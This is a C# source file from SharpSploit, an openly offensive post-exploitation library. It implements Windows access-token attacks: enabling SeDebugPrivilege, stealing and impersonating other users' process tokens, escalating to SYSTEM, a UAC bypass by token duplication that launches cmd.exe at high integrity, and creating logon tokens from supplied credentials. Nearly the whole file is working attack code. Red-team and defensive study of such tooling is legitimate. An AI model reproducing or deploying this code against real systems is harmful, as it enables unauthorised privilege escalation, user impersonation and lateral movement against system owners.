// Author: Ryan Cobb (@cobbr_io)
// Project: SharpSploit (https://github.com/cobbr/SharpSploit)
// License: BSD 3-Clause

using System;
using System.Text;
using System.Linq;
using System.Diagnostics;
using System.ComponentModel;
using System.Security.Principal;
using System.Collections.Generic;
using System.Runtime.InteropServices;

using SharpSploit.Execution;

namespace SharpSploit.Credentials
{
    /// <summary>
    /// Tokens is a library for token manipulation that can be used to impersonate other users, run commands as other user,
    /// and/or to bypass UAC using token duplication.
    /// </summary>
    /// <remarks>
    /// Tokens is adapted from and borrows heavily from Alexander Leary's (@0xbadjuju) Tokenvator (Found
    /// at https://github.com/0xbadjuju/Tokenvator).
    /// </remarks>
    public class Tokens : IDisposable
    {
        private List<IntPtr> OpenHandles = new List<IntPtr>();
        
        /// <summary>
        /// Creates the Tokens class, attempts to obtain the current process' token, and obtain the SeDebugPrivilege.
        /// </summary>
        public Tokens()
        {
            IntPtr currentProcessToken = this.GetCurrentProcessToken();
            if (currentProcessToken == IntPtr.Zero)
            {
                return;
            }

            this.EnableTokenPrivilege(ref currentProcessToken, "SeDebugPrivilege");
        }

        ~Tokens()
        {
            Dispose();
        }

        /// <summary>
        /// Attempts to close all open handles.
        /// </summary>
        public void Dispose()
        {
            foreach (IntPtr handle in this.OpenHandles)
            {
                this.CloseHandle(handle, false);
            }
            this.OpenHandles.Clear();
        }

        /// <summary>
        /// Gets the username of the currently used/impersonated token.
        /// </summary>
        /// <returns>Current username.</returns>
        public string WhoAmI()
        {
            return WindowsIdentity.GetCurrent().Name;
        }

        /// <summary>
        /// Find a process owned by the specificied user and impersonate the token. Used to execute subsequent commands
        /// as the specified user. (Requires Admin)
        /// </summary>
        /// <param name="Username">User to impersonate. "DOMAIN\Username" format expected.</param>
        /// <returns>True if impersonation succeeds, false otherwise.</returns>
        public bool ImpersonateUser(string Username)
        {
            List<UserProcessToken> userProcessTokens = this.GetUserProcessTokensForUser(Username);
            Console.WriteLine("Processes for " + Username + ": " + userProcessTokens.Count);
            foreach (UserProcessToken userProcessToken in userProcessTokens)
            {
                Console.WriteLine("Attempting to impersonate: " + Username);
                if (this.ImpersonateProcess((UInt32)userProcessToken.Process.Id))
                {
                    Console.WriteLine("Impersonated: " + WindowsIdentity.GetCurrent().Name);
                    return true;
                }
            }
            return false;
        }

        /// <summary>
        /// Impersonate the token of the specified process. Used to execute subsequent commands as the user associated
        /// with the token of the specified process. (Requires Admin)
        /// </summary>
        /// <param name="ProcessID">Process ID of the process to impersonate.</param>
        /// <returns>True if impersonation succeeds, false otherwise.</returns>
        public bool ImpersonateProcess(UInt32 ProcessID)
        {
            IntPtr hProcessToken = GetTokenForProcess(ProcessID);
            if (hProcessToken == IntPtr.Zero)
            {
                return false;
            }

            Win32.WinBase._SECURITY_ATTRIBUTES securityAttributes = new Win32.WinBase._SECURITY_ATTRIBUTES();
            IntPtr hDuplicateToken = IntPtr.Zero;
            if (!Win32.Advapi32.DuplicateTokenEx(
                    hProcessToken,
                    (UInt32)Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
                    ref securityAttributes,
                    Win32.WinNT._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                    Win32.WinNT.TOKEN_TYPE.TokenPrimary,
                    out hDuplicateToken
                )
            )
            {
                Console.Error.WriteLine("DuplicateTokenEx() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                this.CloseHandle(hProcessToken);
                return false;
            }
            this.OpenHandles.Add(hDuplicateToken);

            if (!Win32.Advapi32.ImpersonateLoggedOnUser(hDuplicateToken))
            {
                Console.Error.WriteLine("ImpersonateLoggedOnUser() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                this.CloseHandle(hProcessToken);
                this.CloseHandle(hDuplicateToken);
                return false;
            }
            this.CloseHandle(hProcessToken);
            return true;
        }

        /// <summary>
        /// Impersonate the SYSTEM user. Equates to `ImpersonateUser("NT AUTHORITY\SYSTEM")`. (Requires Admin)
        /// </summary>
        /// <returns>True if impersonation succeeds, false otherwise.</returns>
        public bool GetSystem()
        {
            Console.WriteLine("Getting system...");
            SecurityIdentifier securityIdentifier = new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null);
            NTAccount systemAccount = (NTAccount)securityIdentifier.Translate(typeof(NTAccount));
            Console.WriteLine("Impersonate " + systemAccount.ToString() + "...");

            return this.ImpersonateUser(systemAccount.ToString());
        }

        /// <summary>
        /// Bypasses UAC through token duplication and spawns a specified process. (Requires Admin)
        /// </summary>
        /// <param name="Binary">The binary to execute with high integrity.</param>
        /// <param name="Arguments">Arguments to pass to the binary.</param>
        /// <param name="Path">Path that the binary resides in.</param>
        /// <param name="ProcessId">Specify the process for which to perform token duplication. By deafult (0), all
        /// appropriate processes will be tried.</param>
        /// <returns>True if UAC bypass succeeeds, false otherwise.</returns>
        /// <remarks>
        /// Credit for the UAC bypass token duplication technique goes to James Forshaw (@tiraniddo).
        /// Credit for the PowerShell implementation of this bypass goes to Matt Nelson (@enigma0x3).
        /// </remarks>
        public bool BypassUAC(string Binary = "cmd.exe", string Arguments = "", string Path = "C:\\WINDOWS\\System32\\", int ProcessId = 0)
        {
            string Username = WindowsIdentity.GetCurrent().Name;
            List<Process> processes = ProcessId == 0 ?
                                        this.GetUserProcessTokens(true).Select(UPT => UPT.Process).ToList() :
                                        new List<Process> { Process.GetProcessById(ProcessId) };
            Console.WriteLine("Elevated processes: " + processes.Count);
            foreach (Process process in processes)
            {
                // Get PrimaryToken
                IntPtr hProcess = Win32.Kernel32.OpenProcess(Win32.Kernel32.ProcessAccessFlags.PROCESS_QUERY_LIMITED_INFORMATION, false, (UInt32)process.Id);
                if (hProcess == IntPtr.Zero)
                {
                    Console.Error.WriteLine("OpenProcess() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                    continue;
                }
                this.OpenHandles.Add(hProcess);

                IntPtr hProcessToken = IntPtr.Zero;
                if (!Win32.Kernel32.OpenProcessToken(hProcess, (UInt32)Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED, out hProcessToken))
                {
                    Console.Error.WriteLine("OpenProcessToken() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                    continue;
                }
                this.OpenHandles.Add(hProcessToken);
                this.CloseHandle(hProcess);

                Win32.WinBase._SECURITY_ATTRIBUTES securityAttributes = new Win32.WinBase._SECURITY_ATTRIBUTES();
                IntPtr hDuplicateToken = IntPtr.Zero;
                if (!Win32.Advapi32.DuplicateTokenEx(
                       hProcessToken,
                       (UInt32)Win32.Advapi32.TOKEN_ALL_ACCESS,
                       ref securityAttributes,
                       Win32.WinNT._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                       Win32.WinNT.TOKEN_TYPE.TokenPrimary,
                       out hDuplicateToken)
                   )
                {
                    Console.Error.WriteLine("DuplicateTokenEx() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                    continue;
                }
                this.OpenHandles.Add(hDuplicateToken);
                this.CloseHandle(hProcessToken);

                // SetTokenInformation
                Win32.WinNT._SID_IDENTIFIER_AUTHORITY pIdentifierAuthority = new Win32.WinNT._SID_IDENTIFIER_AUTHORITY();
                pIdentifierAuthority.Value = new byte[] { 0x0, 0x0, 0x0, 0x0, 0x0, 0x10 };
                byte nSubAuthorityCount = 1;
                IntPtr pSid = new IntPtr();
                if (!Win32.Advapi32.AllocateAndInitializeSid(ref pIdentifierAuthority, nSubAuthorityCount, 0x2000, 0, 0, 0, 0, 0, 0, 0, out pSid))
                {
                    Console.Error.WriteLine("AllocateAndInitializeSid() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                    continue;
                }

                Win32.WinNT._SID_AND_ATTRIBUTES sidAndAttributes = new Win32.WinNT._SID_AND_ATTRIBUTES();
                sidAndAttributes.Sid = pSid;
                sidAndAttributes.Attributes = Win32.WinNT.SE_GROUP_INTEGRITY_32;

                Win32.WinNT._TOKEN_MANDATORY_LABEL tokenMandatoryLevel = new Win32.WinNT._TOKEN_MANDATORY_LABEL();
                tokenMandatoryLevel.Label = sidAndAttributes;
                Int32 tokenMandatoryLabelSize = Marshal.SizeOf(tokenMandatoryLevel);

                if (Win32.NtDll.NtSetInformationToken(hDuplicateToken, 25, ref tokenMandatoryLevel, tokenMandatoryLabelSize) != 0)
                {
                    Console.Error.WriteLine("NtSetInformationToken() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                    continue;
                }

                IntPtr hFilteredToken = IntPtr.Zero;
                if (Win32.NtDll.NtFilterToken(hDuplicateToken, 4, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref hFilteredToken) != 0)
                {
                    Console.Error.WriteLine("NtFilterToken() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                    continue;
                }
                this.OpenHandles.Add(hFilteredToken);
                this.CloseHandle(hDuplicateToken);

                // ImpersonateUser
                Win32.WinBase._SECURITY_ATTRIBUTES securityAttributes2 = new Win32.WinBase._SECURITY_ATTRIBUTES();
                IntPtr hDuplicateToken2 = IntPtr.Zero;
                if (!Win32.Advapi32.DuplicateTokenEx(
                       hFilteredToken,
                       (UInt32)(Win32.Advapi32.TOKEN_IMPERSONATE | Win32.Advapi32.TOKEN_QUERY),
                       ref securityAttributes2,
                       Win32.WinNT._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                       Win32.WinNT.TOKEN_TYPE.TokenImpersonation,
                       out hDuplicateToken2)
                   )
                {
                    Console.Error.WriteLine("DuplicateTokenEx() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                    continue;
                }
                this.OpenHandles.Add(hDuplicateToken2);
                this.CloseHandle(hFilteredToken);

                if (!Win32.Advapi32.ImpersonateLoggedOnUser(hDuplicateToken2))
                {
                    Console.Error.WriteLine("ImpersonateLoggedOnUser() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                    continue;
                }

                Win32.ProcessThreadsAPI._STARTUPINFO startupInfo = new Win32.ProcessThreadsAPI._STARTUPINFO();
                startupInfo.cb = (UInt32)Marshal.SizeOf(typeof(Win32.ProcessThreadsAPI._STARTUPINFO));
                Win32.ProcessThreadsAPI._PROCESS_INFORMATION processInformation = new Win32.ProcessThreadsAPI._PROCESS_INFORMATION();
                if (!Win32.Advapi32.CreateProcessWithLogonW(Environment.UserName, Environment.UserDomainName, "password",
                    0x00000002, Path + Binary, Path + Binary + " " + Arguments, 0x04000000, IntPtr.Zero, Path, ref startupInfo, out processInformation))
                {
                    Console.Error.WriteLine("CreateProcessWithLogonW() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                    continue;
                }

                return this.RevertToSelf();
            }
            return false;

        }

        /// <summary>
        /// Makes a new token to run a specified function as a specified user with a specified password. Automatically calls
        /// `RevertToSelf()` after executing the function.
        /// </summary>
        /// <typeparam name="T">Type of object to be return by the Action function.</typeparam>
        /// <param name="Username">Username to execute Action as.</param>
        /// <param name="Domain">Domain to authenticate the user to.</param>
        /// <param name="Password">Password to authenticate the user.</param>
        /// <param name="Action">Action to perform as the user</param>
        /// <param name="LogonType">LogonType to use. Defaults to LOGON32_LOGON_INTERACTIVE, which is suitable for local
        /// actions. LOGON32_LOGON_NEW_CREDENTIALS is suitable to perform actions which require remote authentication.</param>
        /// <returns>Object returned by the Action function.</returns>
        /// <remarks>
        /// Credit to https://github.com/mj1856/SimpleImpersonation for the awesome Func(T) idea.
        /// </remarks>
        public T RunAs<T>(string Username, string Domain, string Password, Func<T> Action, Win32.Advapi32.LOGON_TYPE LogonType = Win32.Advapi32.LOGON_TYPE.LOGON32_LOGON_INTERACTIVE)
        {
            IntPtr hProcessToken = IntPtr.Zero;
            if (!Win32.Advapi32.LogonUserA(
                Username, Domain, Password,
                LogonType, Win32.Advapi32.LOGON_PROVIDER.LOGON32_PROVIDER_DEFAULT,
                out hProcessToken))
            {
                Console.Error.WriteLine("LogonUserA() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return default(T);
            }
            this.OpenHandles.Add(hProcessToken);

            if (!Win32.Advapi32.ImpersonateLoggedOnUser(hProcessToken))
            {
                Console.Error.WriteLine("ImpersonateLoggedOnUser() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                this.CloseHandle(hProcessToken);
                return default(T);
            }

            T results = Action();
            this.RevertToSelf();
            return results;
        }

        /// <summary>
        /// Makes a new token with a specified username and password, and impersonates it to conduct future actions as
        /// the specified user.
        /// </summary>
        /// <param name="Username">Username to authenticate as.</param>
        /// <param name="Domain">Domain to authenticate the user to.</param>
        /// <param name="Password">Password to authenticate the user.</param>
        /// <param name="LogonType">LogonType to use. Defaults to LOGON32_LOGON_NEW_CREDENTIALS, which is suitable to
        /// perform actions which require remote authentication. LOGON32_LOGON_INTERACTIVE is suitable for local actions</param>
        /// <returns>True if impersonation succeeds, false otherwise.</returns>
        /// <remarks>
        /// Credit to @rsmudge for the technique detailed here: https://blog.cobaltstrike.com/2015/12/16/windows-access-tokens-and-alternate-credentials
        /// </remarks>
        public bool MakeToken(string Username, string Domain, string Password, Win32.Advapi32.LOGON_TYPE LogonType = Win32.Advapi32.LOGON_TYPE.LOGON32_LOGON_NEW_CREDENTIALS)
        {
            IntPtr hProcessToken = IntPtr.Zero;
            if (!Win32.Advapi32.LogonUserA(
                Username, Domain, Password,
                LogonType, Win32.Advapi32.LOGON_PROVIDER.LOGON32_PROVIDER_DEFAULT,
                out hProcessToken)
                )
            {
                Console.Error.WriteLine("LogonUserA() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return false;
            }
            this.OpenHandles.Add(hProcessToken);

            if (!Win32.Advapi32.ImpersonateLoggedOnUser(hProcessToken))
            {
                Console.Error.WriteLine("ImpersonateLoggedOnUser() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                this.CloseHandle(hProcessToken);
                return false;
            }
            return true;
        }

        /// <summary>
        /// Ends the impersonation of any token, reverting back to the initial token associated with the current process.
        /// Useful in conjuction with functions that impersonate a token and do not automatically RevertToSelf, such
        /// as: `ImpersonateUser()`, `ImpersonateProcess()`, `GetSystem()`, and `MakeToken()`.
        /// </summary>
        /// <returns>True if RevertToSelf succeeds, false otherwise.</returns>
        public bool RevertToSelf()
        {
            if (!Win32.Advapi32.RevertToSelf())
            {
                Console.Error.WriteLine("RevertToSelf() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return false;
            }
            return true;
        }

        private List<UserProcessToken> GetUserProcessTokensForUser(string Username, bool Elevated = false)
        {
            return this.GetUserProcessTokens(Elevated).Where(UP => UP.Username.ToLower() == Username.ToLower()).ToList();
        }

        private List<UserProcessToken> GetUserProcessTokens(bool Elevated = false)
        {
            return Process.GetProcesses().Select(P =>
            {
                try
                {
                    return new UserProcessToken(P);
                }
                catch (CreateUserProcessTokenException e)
                {
                    Console.Error.WriteLine("CreateUserProcessTokenException: " + e.Message);
                    return null;
                }
            }).Where(P => P != null).Where(P => (!Elevated || P.IsElevated)).ToList();
        }

        private static string ConvertTokenStatisticsToUsername(Win32.WinNT._TOKEN_STATISTICS tokenStatistics)
        {
            IntPtr lpLuid = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(Win32.WinNT._LUID)));
            Marshal.StructureToPtr(tokenStatistics.AuthenticationId, lpLuid, false);
            if(lpLuid == IntPtr.Zero)
            {
                Console.Error.WriteLine("PtrToStructure() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return "";
            }

            IntPtr ppLogonSessionData = new IntPtr();
            if (Win32.Secur32.LsaGetLogonSessionData(lpLuid, out ppLogonSessionData) != 0)
            {
                Console.Error.WriteLine("LsaGetLogonSessionData() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return "";
            }
            if (ppLogonSessionData == IntPtr.Zero)
            {
                Console.Error.WriteLine("LsaGetLogonSessionData() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return "";
            }

            Win32.Secur32._SECURITY_LOGON_SESSION_DATA securityLogonSessionData = (Win32.Secur32._SECURITY_LOGON_SESSION_DATA)Marshal.PtrToStructure(ppLogonSessionData, typeof(Win32.Secur32._SECURITY_LOGON_SESSION_DATA));
            if (securityLogonSessionData.pSid == IntPtr.Zero || securityLogonSessionData.Username.Buffer == IntPtr.Zero || securityLogonSessionData.LoginDomain.Buffer == IntPtr.Zero)
            {
                Console.Error.WriteLine("PtrToStructure() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return "";
            }

            return Marshal.PtrToStringUni(securityLogonSessionData.LoginDomain.Buffer) + "\\" + Marshal.PtrToStringUni(securityLogonSessionData.Username.Buffer);
        }

        private IntPtr GetCurrentProcessToken()
        {
            IntPtr currentProcessToken = new IntPtr();
            if (!Win32.Kernel32.OpenProcessToken(Process.GetCurrentProcess().Handle, Win32.Advapi32.TOKEN_ALL_ACCESS, out currentProcessToken))
            {
                Console.Error.WriteLine("OpenProcessToken() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return IntPtr.Zero;
            }
            OpenHandles.Add(currentProcessToken);
            return currentProcessToken;
        }

        private static bool TokenIsElevated(IntPtr hToken)
        {
            UInt32 tokenInformationLength = (UInt32)Marshal.SizeOf(typeof(UInt32));
            IntPtr tokenInformation = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(UInt32)));
            UInt32 returnLength;

            Boolean result = Win32.Advapi32.GetTokenInformation(
                hToken,
                Win32.WinNT._TOKEN_INFORMATION_CLASS.TokenElevationType,
                tokenInformation,
                tokenInformationLength,
                out returnLength
            );

            switch ((Win32.WinNT._TOKEN_ELEVATION_TYPE)Marshal.ReadInt32(tokenInformation))
            {
                case Win32.WinNT._TOKEN_ELEVATION_TYPE.TokenElevationTypeDefault:
                    return false;
                case Win32.WinNT._TOKEN_ELEVATION_TYPE.TokenElevationTypeFull:
                    return true;
                case Win32.WinNT._TOKEN_ELEVATION_TYPE.TokenElevationTypeLimited:
                    return false;
                default:
                    return true;
            }
        }

        private IntPtr GetTokenForProcess(UInt32 ProcessID)
        {
            IntPtr hProcess = Win32.Kernel32.OpenProcess(Win32.Kernel32.ProcessAccessFlags.PROCESS_QUERY_INFORMATION, true, ProcessID);
            if (hProcess == IntPtr.Zero)
            {
                Console.Error.WriteLine("OpenProcess() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return IntPtr.Zero;
            }
            this.OpenHandles.Add(hProcess);

            IntPtr hProcessToken = IntPtr.Zero;
            if (!Win32.Kernel32.OpenProcessToken(hProcess, Win32.Advapi32.TOKEN_ALT, out hProcessToken))
            {
                Console.Error.WriteLine("OpenProcessToken() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return IntPtr.Zero;
            }
            this.OpenHandles.Add(hProcessToken);
            this.CloseHandle(hProcess);

            return hProcessToken;
        }

        private bool CloseHandle(IntPtr handle, bool Remove = true)
        {
            if (Remove) { this.OpenHandles.Remove(handle); }
            return Win32.Kernel32.CloseHandle(handle);
        }

        private static List<String> Privileges = new List<string> { "SeAssignPrimaryTokenPrivilege",
            "SeAuditPrivilege", "SeBackupPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege",
            "SeCreatePagefilePrivilege", "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege",
            "SeCreateTokenPrivilege", "SeDebugPrivilege", "SeEnableDelegationPrivilege",
            "SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege", "SeIncreaseQuotaPrivilege",
            "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege", "SeLockMemoryPrivilege",
            "SeMachineAccountPrivilege", "SeManageVolumePrivilege", "SeProfileSingleProcessPrivilege",
            "SeRelabelPrivilege", "SeRemoteShutdownPrivilege", "SeRestorePrivilege", "SeSecurityPrivilege",
            "SeShutdownPrivilege", "SeSyncAgentPrivilege", "SeSystemEnvironmentPrivilege",
            "SeSystemProfilePrivilege", "SeSystemtimePrivilege", "SeTakeOwnershipPrivilege",
            "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege",
            "SeUndockPrivilege", "SeUnsolicitedInputPrivilege" };

        /// <summary>
        /// Enables a specified security privilege for a specified token. 
        /// </summary>
        /// <param name="hToken">Token to enable a security privilege for.</param>
        /// <param name="Privilege">Privilege to enable.</param>
        /// <returns>True if enabling Token succeeds, false otherwise.</returns>
        public bool EnableTokenPrivilege(ref IntPtr hToken, string Privilege)
        {
            if (!Privileges.Contains(Privilege))
            {
                return false;
            }
            Win32.WinNT._LUID luid = new Win32.WinNT._LUID();
            if (!Win32.Advapi32.LookupPrivilegeValue(null, Privilege, ref luid))
            {
                Console.Error.WriteLine("LookupPrivilegeValue() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return false;
            }

            Win32.WinNT._LUID_AND_ATTRIBUTES luidAndAttributes = new Win32.WinNT._LUID_AND_ATTRIBUTES();
            luidAndAttributes.Luid = luid;
            luidAndAttributes.Attributes = Win32.WinNT.SE_PRIVILEGE_ENABLED;

            Win32.WinNT._TOKEN_PRIVILEGES newState = new Win32.WinNT._TOKEN_PRIVILEGES();
            newState.PrivilegeCount = 1;
            newState.Privileges = luidAndAttributes;

            Win32.WinNT._TOKEN_PRIVILEGES previousState = new Win32.WinNT._TOKEN_PRIVILEGES();
            UInt32 returnLength = 0;
            if (!Win32.Advapi32.AdjustTokenPrivileges(hToken, false, ref newState, (UInt32)Marshal.SizeOf(newState), ref previousState, out returnLength))
            {
                Console.Error.WriteLine("AdjustTokenPrivileges() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return false;
            }

            return true;
        }

        internal class CreateUserProcessTokenException : Exception
        {
            public CreateUserProcessTokenException(string message) : base(message) { }
        }

        public class UserProcessToken
        {
            public string Username { get; }
            public Process Process { get; }
            public Win32.WinNT.TOKEN_TYPE TokenType { get; }
            public bool IsElevated { get; }

            public UserProcessToken(Process process)
            {
                this.Process = process;
                IntPtr hProcess = Win32.Kernel32.OpenProcess(Win32.Kernel32.ProcessAccessFlags.PROCESS_QUERY_LIMITED_INFORMATION, true, (UInt32)this.Process.Id);
                if (hProcess == IntPtr.Zero)
                {
                    throw new CreateUserProcessTokenException("OpenProcess() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                }

                IntPtr hProcessToken;
                if (!Win32.Kernel32.OpenProcessToken(hProcess, (UInt32)Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED, out hProcessToken))
                {
                    throw new CreateUserProcessTokenException("OpenProcessToken() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                }
                Win32.Kernel32.CloseHandle(hProcess);

                UInt32 dwLength = 0;
                Win32.WinNT._TOKEN_STATISTICS tokenStatistics = new Win32.WinNT._TOKEN_STATISTICS();
                this.TokenType = tokenStatistics.TokenType;
                if (!Win32.Advapi32.GetTokenInformation(hProcessToken, Win32.WinNT._TOKEN_INFORMATION_CLASS.TokenStatistics, ref tokenStatistics, dwLength, out dwLength))
                {
                    if (!Win32.Advapi32.GetTokenInformation(hProcessToken, Win32.WinNT._TOKEN_INFORMATION_CLASS.TokenStatistics, ref tokenStatistics, dwLength, out dwLength))
                    {
                        throw new CreateUserProcessTokenException("GetTokenInformation() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                    }
                }
                this.IsElevated = TokenIsElevated(hProcessToken);
                Win32.Kernel32.CloseHandle(hProcessToken);

                this.Username = ConvertTokenStatisticsToUsername(tokenStatistics);
                if (this.Username == null || this.Username == "")
                {
                    throw new CreateUserProcessTokenException("No Username Error");
                }
            }

            private static string ConvertTokenStatisticsToUsername(Win32.WinNT._TOKEN_STATISTICS tokenStatistics)
            {
                IntPtr lpLuid = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(Win32.WinNT._LUID)));
                Marshal.StructureToPtr(tokenStatistics.AuthenticationId, lpLuid, false);
                if (lpLuid == IntPtr.Zero)
                {
                    Console.Error.WriteLine("PtrToStructure() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                    return "";
                }

                IntPtr ppLogonSessionData = new IntPtr();
                if (Win32.Secur32.LsaGetLogonSessionData(lpLuid, out ppLogonSessionData) != 0)
                {
                    Console.Error.WriteLine("LsaGetLogonSessionData() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                    return "";
                }
                if (ppLogonSessionData == IntPtr.Zero)
                {
                    Console.Error.WriteLine("LsaGetLogonSessionData() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                    return "";
                }

                Win32.Secur32._SECURITY_LOGON_SESSION_DATA securityLogonSessionData = (Win32.Secur32._SECURITY_LOGON_SESSION_DATA)Marshal.PtrToStructure(ppLogonSessionData, typeof(Win32.Secur32._SECURITY_LOGON_SESSION_DATA));
                if (securityLogonSessionData.pSid == IntPtr.Zero || securityLogonSessionData.Username.Buffer == IntPtr.Zero || securityLogonSessionData.LoginDomain.Buffer == IntPtr.Zero)
                {
                    Console.Error.WriteLine("PtrToStructure() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                    return "";
                }

                if (Marshal.PtrToStringUni(securityLogonSessionData.Username.Buffer) == Environment.MachineName + "$")
                {
                    string Username = ConvertSidToName(securityLogonSessionData.pSid);
                    if (Username == null || Username == "")
                    {
                        Console.Error.WriteLine("No Username Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                        return "";
                    }
                    return Username;
                }

                return Marshal.PtrToStringUni(securityLogonSessionData.LoginDomain.Buffer) + "\\" + Marshal.PtrToStringUni(securityLogonSessionData.Username.Buffer);
            }


            public static string ConvertSidToName(IntPtr pSid)
            {
                StringBuilder lpName = new StringBuilder();
                UInt32 cchName = (UInt32)lpName.Capacity;
                StringBuilder lpReferencedDomainName = new StringBuilder();
                UInt32 cchReferencedDomainName = (UInt32)lpReferencedDomainName.Capacity;
                Win32.WinNT._SID_NAME_USE sidNameUser;
                Win32.Advapi32.LookupAccountSid(String.Empty, pSid, lpName, ref cchName, lpReferencedDomainName, ref cchReferencedDomainName, out sidNameUser);

                lpName.EnsureCapacity((Int32)cchName);
                lpReferencedDomainName.EnsureCapacity((Int32)cchReferencedDomainName);
                if (Win32.Advapi32.LookupAccountSid(String.Empty, pSid, lpName, ref cchName, lpReferencedDomainName, ref cchReferencedDomainName, out sidNameUser))
                {
                    return "";
                }
                if (String.IsNullOrEmpty(lpName.ToString()) || String.IsNullOrEmpty(lpReferencedDomainName.ToString()))
                {
                    return "";
                }
                return lpReferencedDomainName.ToString() + "\\" + lpName.ToString();
            }
        }
    }
}
